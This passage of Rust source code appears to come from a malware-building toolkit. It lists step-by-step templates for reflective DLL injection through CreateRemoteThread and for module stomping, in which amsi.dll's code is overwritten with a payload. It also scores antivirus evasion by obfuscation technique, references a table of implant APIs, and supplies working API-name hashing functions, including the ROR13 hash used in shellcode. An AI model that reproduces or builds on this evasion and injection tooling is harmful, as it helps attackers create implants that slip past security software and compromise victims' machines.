                                // 3. Write PE headers\n\
                                // 4. Write each section at correct RVA\n\
                                // 5. Write relocation fixup shellcode\n\
                                // 6. Write import resolution shellcode\n\
                                // 7. CreateRemoteThread at shellcode entry"
                    .to_string(),
                detection_risk: 0.6,
            },
            ReflectiveLoadConfig {
                loader_type: ReflectiveLoaderType::ModuleStomping,
                description: "Module stomping: load a legitimate DLL, then overwrite its .text \
                              section with payload code. The loaded module appears legitimate \
                              in PEB->Ldr linked list."
                    .to_string(),
                api_calls: vec!["LoadLibraryA".to_string(), "VirtualProtect".to_string()],
                code_template: "// Module stomping\n\
                                // 1. LoadLibrary a benign DLL (e.g., amsi.dll)\n\
                                // 2. VirtualProtect .text to RWX\n\
                                // 3. Overwrite .text with payload\n\
                                // 4. VirtualProtect .text back to RX\n\
                                // 5. Call overwritten entry point"
                    .to_string(),
                detection_risk: 0.4,
            },
        ]
    }

    /// Estimate AV evasion score based on technique coverage.
    fn estimate_evasion_score(&self, coverage: &HashMap<ObfuscationTechnique, usize>) -> f64 {
        let technique_weights: &[(ObfuscationTechnique, f64)] = &[
            (ObfuscationTechnique::StringEncryption, 0.15),
            (ObfuscationTechnique::ApiHashing, 0.2),
            (ObfuscationTechnique::ControlFlowObfuscation, 0.15),
            (ObfuscationTechnique::PackerStub, 0.2),
            (ObfuscationTechnique::PeHeaderStomp, 0.1),
            (ObfuscationTechnique::ProcessHollowing, 0.1),
            (ObfuscationTechnique::ReflectiveLoading, 0.1),
        ];

        let mut score = 0.0;
        for (tech, weight) in technique_weights {
            if coverage.contains_key(tech) {
                score += weight;
            }
        }
        (score * 100.0).min(100.0)
    }

    /// Return reference table of common implant APIs.
    pub fn common_implant_apis() -> &'static [(&'static str, &'static str)] {
        COMMON_IMPLANT_APIS
    }

    /// Compute a CRC32 hash of a function name (useful standalone utility).
    pub fn crc32_hash(name: &str) -> u32 {
        let mut crc: u32 = 0xFFFFFFFF;
        for b in name.as_bytes() {
            crc ^= *b as u32;
            for _ in 0..8 {
                if crc & 1 != 0 {
                    crc = (crc >> 1) ^ 0xEDB88320;
                } else {
                    crc >>= 1;
                }
            }
        }
        crc ^ 0xFFFFFFFF
    }

    /// Compute a DJB2 hash of a function name.
    pub fn djb2_hash(name: &str) -> u32 {
        let mut hash: u32 = 5381;
        for b in name.as_bytes() {
            hash = hash.wrapping_mul(33).wrapping_add(*b as u32);
        }
        hash
    }

    /// Compute ROR13 additive hash (commonly used in shellcode).
    pub fn ror13_hash(name: &str) -> u32 {
        let mut hash: u32 = 0;
        for b in name.as_bytes() {
            hash = hash.rotate_right(13).wrapping_add(*b as u32);
        }
        hash
    }
}
